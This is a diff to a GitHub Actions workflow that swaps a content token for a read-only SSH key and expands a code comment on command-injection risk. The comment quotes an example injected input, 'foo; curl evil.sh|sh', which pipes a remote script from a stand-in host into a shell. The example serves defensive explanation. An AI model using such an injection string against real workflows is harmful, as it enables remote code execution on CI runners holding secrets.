@@ -30,7 +30,7 @@ jobs:
         with:
           repository: devable-dev/devable
           ref: ${{ inputs.ref }}
-          token: ${{ secrets.DEVABLE_CONTENT_TOKEN }}
+          ssh-key: ${{ secrets.DEVABLE_CONTENT_SSH_KEY }}
           path: devable
 
       - uses: actions/setup-go@v5
@@ -54,7 +54,10 @@ jobs:
       # IMAGES is passed via env, not interpolated directly into `run:` —
       # direct interpolation of a workflow_dispatch input into a run script
       # is a command-injection vector (e.g. `images: "foo; curl evil.sh|sh"`)
-      # on a runner that holds DEVABLE_CONTENT_TOKEN and packages:write.
+      # on a runner that holds DEVABLE_CONTENT_SSH_KEY (read-only) and
+      # packages:write. The read-only key bounds what an injected command
+      # could do with repo access; it doesn't bound packages:write, which is
+      # why IMAGES is still routed through env instead of raw interpolation.
       # The env var still word-splits the same way the raw input would.
       - name: Verify and push
         working-directory: devable
